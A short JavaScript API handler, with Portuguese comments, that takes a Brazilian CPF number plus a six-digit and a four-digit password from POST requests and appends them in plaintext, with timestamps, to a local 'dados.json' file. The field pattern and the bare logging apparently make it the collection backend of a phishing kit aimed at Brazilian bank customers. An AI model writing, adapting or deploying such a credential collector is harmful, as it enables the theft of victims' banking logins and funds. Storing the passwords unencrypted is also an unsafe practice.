import fs from 'fs'
import path from 'path'

const filePath = path.join(process.cwd(), 'dados.json')

export default function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método não permitido' })
  }

  const { cpf, senha6, senha4 } = req.body

  if (!cpf || !senha6 || !senha4) {
    return res.status(400).json({ error: 'Dados incompletos' })
  }

  try {
    // Definir fuso horário de São Paulo
    const dataHora = new Date().toLocaleString('pt-BR', {
      timeZone: 'America/Sao_Paulo',
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit'
    })

    // Preparar dados para salvar
    const dadosParaSalvar = {
      cpf: cpf,
      senha6: senha6,
      senha4: senha4,
      data_hora: dataHora,
      timestamp: Math.floor(Date.now() / 1000)
    }

    // Ler dados existentes
    let dadosExistentes = []
    if (fs.existsSync(filePath)) {
      try {
        const conteudo = fs.readFileSync(filePath, 'utf8')
        dadosExistentes = JSON.parse(conteudo)
        if (!Array.isArray(dadosExistentes)) {
          dadosExistentes = []
        }
      } catch (error) {
        console.error('Erro ao ler arquivo:', error)
        dadosExistentes = []
      }
    }

    // Adicionar novo registro
    dadosExistentes.push(dadosParaSalvar)

    // Salvar no arquivo JSON
    fs.writeFileSync(filePath, JSON.stringify(dadosExistentes, null, 4), 'utf8')

    return res.status(200).json({ success: true, message: 'Dados salvos com sucesso' })
  } catch (error) {
    console.error('Erro ao salvar dados:', error)
    return res.status(500).json({ error: 'Erro ao salvar dados' })
  }
}

